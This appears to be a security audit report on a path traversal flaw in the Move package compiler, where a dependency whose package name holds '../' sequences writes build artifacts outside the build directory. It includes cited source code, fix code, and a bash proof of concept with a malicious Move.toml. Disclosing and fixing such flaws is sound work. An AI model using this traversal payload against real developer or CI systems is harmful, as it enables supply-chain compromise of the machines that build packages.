# Audit Report

## Title
Path Traversal Vulnerability in Move Package Dependency Resolution Allows Arbitrary File System Writes

## Summary
The Move package compilation system fails to validate both `Dependency.local` paths and package names, allowing path traversal attacks. A malicious dependency package can specify a package name containing `../` sequences, causing compiled artifacts to be written outside the intended build directory to arbitrary filesystem locations.

## Finding Description

The vulnerability exists through a chain of missing validations in the Move package system:

**Step 1 - Unvalidated Dependency Path**: When parsing dependencies, the `local` field accepts any path without validation, including absolute paths: [1](#0-0) 

**Step 2 - Absolute Path Resolution**: When resolving dependencies, if `dep.local` is an absolute path, `PathBuf::push` replaces the entire path rather than appending: [2](#0-1) 

**Step 3 - Unvalidated Package Name**: Package names are type-aliased to `Symbol` with no validation, allowing path traversal sequences like `../`: [3](#0-2) 

The legacy parser extracts package names without any sanitization: [4](#0-3) 

**Step 4 - Path Traversal in Artifact Writing**: When saving compiled dependency artifacts, the package name is directly incorporated into the file path: [5](#0-4) 

This path is then passed to `save_under` which writes to the filesystem: [6](#0-5) 

**Attack Scenario**:
1. Attacker creates malicious package at `/tmp/malicious/Move.toml`:
   ```toml
   [package]
   name = "../../../../../tmp/evil"
   version = "1.0.0"
   ```

2. Victim adds dependency: `malicious = { local = "/tmp/malicious" }`

3. Upon compilation, artifacts are written to:
   `<project>/build/<root_pkg>/bytecode_modules/dependencies/../../../../../tmp/evil/<module>.mv`
   
4. This resolves to `/tmp/evil/<module>.mv`, escaping the build directory

## Impact Explanation

**Severity: High** ($50,000 category)

This vulnerability allows arbitrary filesystem writes through:
- Writing compiled Move bytecode (`.mv`)
- Source maps (`.mvsm`)  
- Documentation files (`.md`)
- ABI files (`.abi`)

Additionally, the `create_dir_all` call creates arbitrary directory structures on the victim's filesystem.

While this doesn't directly impact blockchain consensus, it represents a **supply chain attack vector** that could:
- Compromise developer machines building Move packages
- Compromise CI/CD systems that compile Move code
- Potentially compromise validator nodes if they compile untrusted packages
- Enable privilege escalation if attacker can write to sensitive locations

The impact is classified as "Significant protocol violations" under the High Severity category, as it violates the filesystem isolation invariant expected from package compilation.

## Likelihood Explanation

**Likelihood: Medium**

The attack requires:
- Victim to explicitly add a malicious dependency to their `Move.toml`
- Victim to run compilation with that dependency

However:
- Developers commonly add external dependencies
- The absolute path in `local` may not appear suspicious in certain contexts (e.g., local testing)
- Social engineering could convince developers to add "useful" packages
- Automated dependency resolution systems could be exploited

## Recommendation

Implement strict validation for both dependency paths and package names:

1. **Validate Dependency Paths** in `parse_dependency`:
```rust
let local_path = PathBuf::from(local_str);
// Reject absolute paths
if local_path.is_absolute() {
    bail!("Dependency 'local' path cannot be absolute: {}", local_str);
}
// Reject paths with traversal sequences
if local_str.contains("..") {
    bail!("Dependency 'local' path cannot contain '..': {}", local_str);
}
```

2. **Enforce Package Name Validation** by using the validated `PackageName` type from `move-package-manifest` or adding validation to the legacy parser:
```rust
fn is_valid_package_name(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => (),
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

let name = name.as_str()
    .ok_or_else(|| format_err!("Package name must be a string"))?;
if !is_valid_package_name(name) {
    bail!("Invalid package name '{}': must start with letter or _, contain only letters, digits, - and _", name);
}
```

3. **Canonicalize All Paths** before use to prevent traversal.

## Proof of Concept

```bash
# Setup malicious package
mkdir -p /tmp/malicious/sources
cat > /tmp/malicious/Move.toml << 'EOF'
[package]
name = "../../../../../tmp/evil"
version = "1.0.0"

[addresses]
std = "0x1"
EOF

cat > /tmp/malicious/sources/Evil.move << 'EOF'
module std::Evil {
    public fun exploit() {}
}
EOF

# Setup victim package
mkdir -p /tmp/victim
cat > /tmp/victim/Move.toml << 'EOF'
[package]
name = "victim"
version = "1.0.0"

[dependencies]
malicious = { local = "/tmp/malicious" }

[addresses]
std = "0x1"
EOF

# Compile victim package
cd /tmp/victim
aptos move compile

# Verify escape - artifacts written to /tmp/evil/ instead of /tmp/victim/build/
ls -la /tmp/evil/
```

Expected result: Compiled artifacts appear in `/tmp/evil/` directory, demonstrating successful directory traversal and arbitrary filesystem write.

## Notes

This vulnerability specifically affects the **legacy Move package parser** currently in use. The newer `move-package-manifest` crate includes proper validation, but it is not being used in the Aptos Core compilation path. Migration to the validated parser would resolve this issue.

### Citations

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L124-127)
```rust
            let name = name
                .as_str()
                .ok_or_else(|| format_err!("Package name must be a string"))?;
            let name = PM::PackageName::from(name);
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L342-354)
```rust
                (Some(local), None, None) => {
                    let local_str = local
                        .as_str()
                        .ok_or_else(|| format_err!("Local source path not a string"))?;
                    let local_path = PathBuf::from(local_str);
                    Ok(PM::Dependency {
                        subst,
                        version,
                        digest,
                        local: local_path,
                        git_info,
                        node_info,
                    })
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L499-517)
```rust
    fn parse_package_manifest(
        dep: &Dependency,
        dep_name: &PackageName,
        mut root_path: PathBuf,
    ) -> Result<(SourceManifest, PathBuf)> {
        root_path.push(&dep.local);
        match fs::read_to_string(root_path.join(SourcePackageLayout::Manifest.path())) {
            Ok(contents) => {
                let source_package: SourceManifest =
                    parse_move_manifest_string(contents).and_then(parse_source_manifest)?;
                Ok((source_package, root_path))
            },
            Err(_) => Err(anyhow::format_err!(
                "Unable to find package manifest for '{}' at {:?}",
                dep_name,
                SourcePackageLayout::Manifest.path().join(root_path),
            )),
        }
    }
```

**File:** third_party/move/tools/move-package/src/source_package/parsed_manifest.rs (L9-12)
```rust
pub type NamedAddress = Symbol;
pub type PackageName = Symbol;
pub type FileName = Symbol;
pub type PackageDigest = Symbol;
```

**File:** third_party/move/tools/move-package/src/compilation/compiled_package.rs (L279-284)
```rust
    pub(crate) fn save_under(&self, file: impl AsRef<Path>, bytes: &[u8]) -> Result<()> {
        let path_to_save = self.root_path.join(file);
        let parent = path_to_save.parent().unwrap();
        std::fs::create_dir_all(parent)?;
        std::fs::write(path_to_save, bytes).map_err(|err| err.into())
    }
```

**File:** third_party/move/tools/move-package/src/compilation/compiled_package.rs (L337-348)
```rust
        let file_path = if root_package == package_name {
            PathBuf::new()
        } else {
            CompiledPackageLayout::Dependencies
                .path()
                .join(package_name.as_str())
        }
        .join(match &compiled_unit.unit {
            CompiledUnit::Script(named) => named.name.as_str(),
            CompiledUnit::Module(named) => named.name.as_str(),
        });

```
